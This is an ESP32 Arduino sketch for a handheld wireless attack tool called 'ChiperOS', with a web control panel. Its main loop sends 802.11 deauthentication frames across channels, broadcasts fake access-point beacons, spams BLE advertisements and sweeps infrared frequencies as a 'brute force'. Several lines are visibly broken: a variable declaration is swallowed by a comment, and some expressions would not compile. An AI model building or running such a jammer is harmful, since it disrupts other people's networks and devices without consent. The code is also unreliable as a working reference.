#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <driver/ledc.h>

// === PINS ===
#define BTN1 0  // Меню / Вверх
#define BTN2 1  // Выбор / Вниз
#define BTN3 2  // Стоп / Назад
#define IR1 38
#define IR2 39
#define IR3 40

TFT_eSPI tft = TFT_eSPI();
WebServer server(80);

// === STATE ===
enum Mode { WEB_MODE, ATTACK_MODE };
Mode currentMode = WEB_MODE;
bool deauthOn = false, fakeApOn = false, bleOn = false, irGunOn = false;
unsigned long lastBtn = 0, lastDeauth = 0, lastBle = 0, lastFakeAp = 0, lastIr = 0;
int menuIdx = 0;

// === DEAUTH ===
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF, 0x02, 0x00
};
int targetCh = 1;

// === IR BRUTE FORCE ===
int irFreq = 30000;      // Старт 30kHz
const int irFreqMin = 30000;
const int irFreqMax = 56000;
const int irFreqStep = 500;
int irPulseLen = 10;     // мс
int irPinIdx = 0;
bool irFwd = true;       // Направление перебора частот

// === HTML ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChiperOS</title><style>
body{background:#0d1117;color:#0f0;font-family:monospace;text-align:center;padding:15px}
h1{color:#0ff} .c{background:#111;border:1px solid #333;padding:10px;margin:8px;border-radius:6px}.b{padding:10px 15px;margin:4px;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
.r{background:#d32f2f;color:#fff}.g{background:#388e3c;color:#fff}.b2{background:#1976d2;color:#fff}
.s{padding:4px;margin:4px;border-radius:3px;font-weight:bold}.on{background:#0f0;color:#000}.off{background:#333;color:#666}
</style></head><body>
<h1>🛡️ ChiperOS v2.0</h1>
<div class="c"><h3>WiFi</h3><div id="sD" class="s off">DEAUTH OFF</div><div id="sF" class="s off">FAKE AP OFF</div>
<button class="b r" onclick="t('deauth')">Deauth</button><button class="b g" onclick="t('fakeap')">FakeAP</button></div>
<div class="c"><h3>BLE & IR</h3><div id="sB" class="s off">BLE OFF</div><div id="sI" class="s off">IR SWEEP OFF</div>
<button class="b b2" onclick="t('ble')">BLE Spam</button><button class="b r" onclick="t('ir')">IR Sweep</button></div>
<div class="c" id="st">Loading...</div>
<script>
function t(a){fetch('/'+a).then(r=>r.text()).then(d=>{document.getElementById('st').innerHTML=d;update();});}
function update(){fetch('/st').then(r=>r.text()).then(d=>{
  document.getElementById('sD').className='s '+(d.includes('DEAUTH:ON')?'on':'off');
  document.getElementById('sF').className='s '+(d.includes('FAKE:ON')?'on':'off');
  document.getElementById('sB').className='s '+(d.includes('BLE:ON')?'on':'off');
  document.getElementById('sI').className='s '+(d.includes('IR:ON')?'on':'off');
  document.getElementById('st').innerHTML=d;});}
setInterval(update,1000);update();
</script></body></html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  pinMode(BTN1, INPUT_PULLUP); 
  pinMode(BTN2, INPUT_PULLUP); 
  pinMode(BTN3, INPUT_PULLUP);

  // TFT Init
  delay(800);
  tft.init(); tft.setRotation(1); tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN); tft.setTextFont(2);
  tft.drawString("ChiperOS v2.0", 10, 10);
  if(TFT_BL>=0){pinMode(TFT_BL,OUTPUT);digitalWrite(TFT_BL,HIGH);}

  // IR PWM Init (Channel 0)
  ledcSetup(0, 38000, 8); // 38kHz, 8-bit duty

  // Deauth Frame Init
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);

  // WiFi AP
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("ChiperOS", "12345678");

  // Web Routes
  server.on("/", [](){server.send(200,"text/html",html);});
  server.on("/deauth", [](){deauthOn=!deauthOn; switchMode(); server.send(200,"text/plain",deauthOn?"DEAUTH:ON":"DEAUTH:OFF");});
  server.on("/fakeap", [](){fakeApOn=!fakeApOn; switchMode(); server.send(200,"text/plain",fakeApOn?"FAKE:ON":"FAKE:OFF");});
  server.on("/ble", [](){bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3"); server.send(200,"text/plain",bleOn?"BLE:ON":"BLE:OFF");});  server.on("/ir", [](){irGunOn=!irGunOn; irFreq=irFreqMin; server.send(200,"text/plain",irGunOn?"IR SWEEP ON":"IR SWEEP OFF");});
  server.on("/st", [](){
    String s="DEAUTH:"+(deauthOn?"ON":"OFF")+"|FAKE:"+(fakeApOn?"ON":"OFF")+"|BLE:"+(bleOn?"ON":"OFF")+"|IR:"+(irGunOn?"ON":"OFF");
    s+="<br>Heap:"+String(ESP.getFreeHeap()/1024)+"KB PSRAM:"+String(ESP.getPsramSize()/1024)+"KB";
    s+="<br>IR Freq:"+String(irFreq)+"Hz Pulse:"+String(irPulseLen)+"ms";
    server.send(200,"text/html",s);
  });
  server.begin();

  tft.drawString("WiFi: 192.168.4.1", 10, 30);
  tft.drawString("Ready.", 10, 50);
  Serial.println("✅ ChiperOS v2.0 Ready");
}

void switchMode() {
  bool attack = deauthOn || fakeApOn || bleOn;
  if(attack && currentMode==WEB_MODE){
    currentMode=ATTACK_MODE;
    server.stop(); WiFi.softAPdisconnect(true);
    esp_wifi_set_promiscuous(true);
    tft.drawString("MODE: ATTACK", 10, 70);
  } else if(!attack && currentMode==ATTACK_MODE){
    currentMode=WEB_MODE;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_AP); WiFi.softAP("ChiperOS","12345678");
    server.begin();
    tft.drawString("MODE: WEB   ", 10, 70);
  }
}

void loop() {
  // Buttons (debounce 200ms)
  if(millis()-lastBtn>200){
    lastBtn=millis();
    if(digitalRead(BTN1)==LOW){ menuIdx=(menuIdx+1)%3; updateTFT(); }
    if(digitalRead(BTN2)==LOW){ triggerMenu(); }
    if(digitalRead(BTN3)==LOW){ 
      deauthOn=fakeApOn=bleOn=irGunOn=false; 
      switchMode(); 
      updateTFT(); 
    }
  }

  if(currentMode==WEB_MODE) server.handleClient();

  // === DEAUTH ===
  if(deauthOn && millis()-lastDeauth>10){
    lastDeauth=millis();
    static int ch=1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch=(ch==1)?6:(ch==6)?11:1;    deauthFrame[22]=random(256); deauthFrame[23]=random(256);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
  }

  // === FAKE AP ===
  if(fakeApOn && millis()-lastFakeAp>200){
    lastFakeAp=millis();
    uint8_t b[128]; memset(b,0,128);
    b[0]=0x80; b[1]=0x00; memset(&b[4],0xFF,6);
    b[10]=0x02; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00; b[15]=random(6);
    memcpy(&b[16],&b[10],6); memcpy(&b[24],&millis(),8);
    b[32]=0xE8; b[33]=0x03; b[34]=0x01; b[35]=0x00;
    int p=36; String n="LOL_BRO"; b[p++]=0x00; b[p++]=n.length(); memcpy(&b[p],n.c_str(),n.length()); p+=n.length();
    b[p++]=0x01; b[p++]=0x08; b[p++]=0x82; b[p++]=0x84; b[p++]=0x8B; b[p++]=0x96;
    b[p++]=0x24; b[p++]=0x30; b[p++]=0x48; b[p++]=0x6C;
    esp_wifi_80211_tx(WIFI_IF_AP, b, p, false);
  }

  // === BLE SPAM ===
  if(bleOn && millis()-lastBle>100){
    lastBle=millis();
    BLEAdvertising* p=BLEDevice::getAdvertising(); p->stop();
    p->addServiceUUID(BLEUUID((uint16_t)random(0x1800,0x2000)));
    p->setMinPreferred(0x06); p->setMaxPreferred(0x12); p->start();
  }

  // === IR BRUTE FORCE SWEEP ===
  if(irGunOn && millis()-lastIr>irPulseLen){
    lastIr=millis();
    int currentPin = (irPinIdx==0)?IR1:(irPinIdx==1)?IR2:IR3;
    
    // Update frequency dynamically
    ledcSetup(0, irFreq, 8);
    ledcAttachPin(currentPin, 0);
    ledcWrite(0, 85); // 33% duty cycle (standard for IR)
    
    // Next state
    irPinIdx = (irPinIdx + 1) % 3;
    
    // Frequency sweep logic
    if(irFwd) {
      irFreq += irFreqStep;
      if(irFreq >= irFreqMax) { irFreq = irFreqMax; irFwd = false; irPulseLen = (irPulseLen==10)?20:(irPulseLen==20)?30:50; }
    } else {
      irFreq -= irFreqStep;
      if(irFreq <= irFreqMin) { irFreq = irFreqMin; irFwd = true; irPulseLen = 10; }
    }
  }

  // TFT Update (every 1s)  static unsigned long lastTFT = 0;
  if(millis()-lastTFT>1000){
    lastTFT=millis();
    updateTFT();
  }

  yield();
}

void triggerMenu(){
  if(menuIdx==0){ 
    tft.fillRect(0,90,240,40,TFT_BLACK);
    tft.drawString("Scanning...", 10, 90);
    int n=WiFi.scanNetworks();
    tft.drawString("Found: "+String(n)+" nets", 10, 90);
  }
  else if(menuIdx==1){ deauthOn=!deauthOn; switchMode(); }
  else if(menuIdx==2){ bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3"); }
  updateTFT();
}

void updateTFT(){
  tft.fillRect(0,70,240,60,TFT_BLACK);
  tft.drawString("Mode: "+String(currentMode==WEB_MODE?"WEB":"ATK"),10,70);
  tft.drawString("Heap: "+String(ESP.getFreeHeap()/1024)+"KB",10,90);
  tft.drawString("IR: "+String(irFreq)+"Hz "+String(irPulseLen)+"ms",10,110);
}
